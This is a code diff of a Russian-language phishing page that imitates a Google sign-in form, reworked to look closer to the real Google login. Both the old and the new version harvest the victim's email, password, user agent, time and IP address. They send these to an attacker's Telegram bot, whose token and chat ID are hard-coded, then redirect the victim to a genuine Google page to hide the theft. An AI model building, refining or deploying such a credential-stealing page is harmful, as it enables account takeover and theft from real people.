@@ -1,124 +1,114 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Вход через Google</title>
-  <style>
-    body {
-      body {
-  background: linear-gradient(135deg, #667eea, #764ba2);
-  font-family: Arial, sans-serif;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  margin: 0;
-}
-   .container {
-  background-color: white;
-  padding: 30px;
-  border-radius: 15px;
-  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-  width: 350px;
-  text-align: center;
-}
-    .container h1 {
-      margin-bottom: 20px;
-      font-size: 24px;
-      color: #202124;
-    }
-    .container input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      font-size: 14px;
-    }
-    .container button {
-      width: 100%;
-      padding: 10px;
-      background-color: #4285F4;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    .container button:hover {
-      background-color: #357ABD;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Вход</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container img {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        .login-container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #1765cc;
+        }
+        .footer-text {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        @media (max-width: 500px) {
+            .login-container {
+                padding: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Вход через Google</h1>
-    <form onsubmit="sendData(event, 'google')">
-      <input type="email" id="email" placeholder="Email" required>
-      <input type="password" id="password" placeholder="Пароль" required>
-      <button type="submit">Войти</button>
-    </form>
-  </div>
+    <div class="login-container">
+        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+        <h2>Вход в аккаунт Google</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email или телефон" required>
+            <input type="password" id="password" placeholder="Введите пароль" required>
+            <button type="submit">Далее</button>
+        </form>
+        <div class="footer-text">Google может использовать информацию для улучшения сервисов.</div>
+    </div>
 
-  <script>
-    // Токен вашего бота и chat_id
-    const BOT_TOKEN = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";  // Замените на токен вашего бота
-    const CHAT_ID = "7947290290";      // Замените на ваш chat_id
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString();
 
-    // Функция для отправки данных
-    function sendData(event, service) {
-      event.preventDefault(); // Отменяем стандартное поведение формы
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const message = `🔍 Вход через Google\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🖥️ User-Agent: ${userAgent}\n🕒 Время: ${timestamp}\n🌐 IP: ${ip}`;
 
-      // Получаем данные из формы
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      // Получаем информацию о пользователе
-      const user_ip = ''; // IP-адрес можно получить через сторонний сервис (например, ipify)
-      const user_agent = navigator.userAgent;
-      const current_time = new Date().toLocaleString();
-
-      // Формируем сообщение для Telegram
-      const message = `
-    Новый вход через ${service}:
-    Время: ${current_time}
-    IP: ${user_ip}
-    User-Agent: ${user_agent}
-    Email: ${email}
-    Пароль: ${password}
-      `;
-
-      // Отправляем данные в Telegram
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const params = {
-        chat_id: CHAT_ID,
-        text: message
-      };
-
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Данные отправлены в Telegram:', data);
-        // Перенаправление на оригинальный сайт
-        if (service === 'google') {
-          window.location.href = 'https://google.com';
-        } else if (service === 'facebook') {
-          window.location.href = 'https://facebook.com';
-        } else if (service === 'vk') {
-          window.location.href = 'https://vk.com';
-        }
-      })
-      .catch(error => {
-        console.error('Ошибка отправки данных:', error);
-      });
-    }
-  </script>
+                    const botToken = '7728203229:AAHjqI6dvF1AL9mlOEgbgcJu3Xs9UiBgXRY';
+                    const chatId = '1782608280';
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: chatId, text: message})
+                    });
+                })
+                .finally(() => {
+                    window.location.href = 'https://accounts.google.com';
+                });
+        });
+    </script>
 </body>
 </html>
